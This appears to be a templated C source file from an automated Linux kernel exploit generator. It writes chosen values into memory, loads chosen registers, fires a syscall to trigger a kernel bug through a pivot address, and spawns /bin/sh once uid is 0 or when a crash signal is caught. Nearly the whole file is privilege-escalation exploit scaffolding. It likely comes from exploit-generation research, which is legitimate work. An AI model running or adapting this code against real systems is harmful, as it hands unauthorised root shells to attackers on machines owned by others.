unsigned long pivot = {{ "%#x" % init_pc }};
==============================================================
/******************************************************************/
/*************************AUTO GENERATED***************************/
#define _GNU_SOURCE
#ifndef va_start
#include <stdarg.h>
#endif
#ifndef assert
#include <assert.h>
#endif
#ifndef signal
#include <signal.h>
#endif
#ifndef sched_setaffinity
#include <sched.h>
#endif

// we need this because rcx may not be restored in the trampoline
// so it will crash during kernel-user switch
void get_shell(int signum) {
	printf("uid: %d\n", getuid());
	system("/bin/sh");
	while(1);
}

void __attribute__((constructor)) _igni_init() {
	signal(SIGSEGV, get_shell);
	signal(SIGTRAP, get_shell);
}

unsigned long _args[6];
unsigned long _arg_num = 0;
void __trigger()
{
	{% for addr, val in user_data.items() %}
	*(u64*){{addr}} = {{ '%#x' %  val}};
	{% endfor %}

	__asm__(".intel_syntax noprefix;"
			"push rbp;"

			"mov rcx, %0;"
			"mov rdi, [rcx+8*0];"
			"mov rsi, [rcx+8*1];"
			"mov rdx, [rcx+8*2];"
			"mov r10, [rcx+8*3];"
			"mov r8, [rcx+8*4];"
			"mov r9, [rcx+8*5];"

			{% for reg, val in regs.items() %}
			"mov {{ reg }}, {{ '%#x' % val }};"
			{% endfor %}

			"mov rax, {{sys_num}};"
			"syscall;"
			"pop rbp;"
			".att_syntax;"
			: : "r"(_args));
}

void _trigger(int num_args, ...)
{
	va_list ap;
	va_start(ap, num_args);
	for(int i=0; i<num_args; i++) {
		_args[_arg_num++] = va_arg(ap, unsigned long);
	}
	va_arg(ap, unsigned long);
	va_end(ap);

	__asm__(".intel_syntax noprefix;"
			"call __trigger;"
			".att_syntax;");
	_arg_num = 0;
	if(getuid() == 0) get_shell(0);
}

#define NUMARGS(...)  (sizeof((unsigned long[]){__VA_ARGS__})/sizeof(unsigned long))
#define ignite(...) _trigger(NUMARGS(__VA_ARGS__), __VA_ARGS__ )
/*************************AUTO GENERATED***************************/
/******************************************************************/
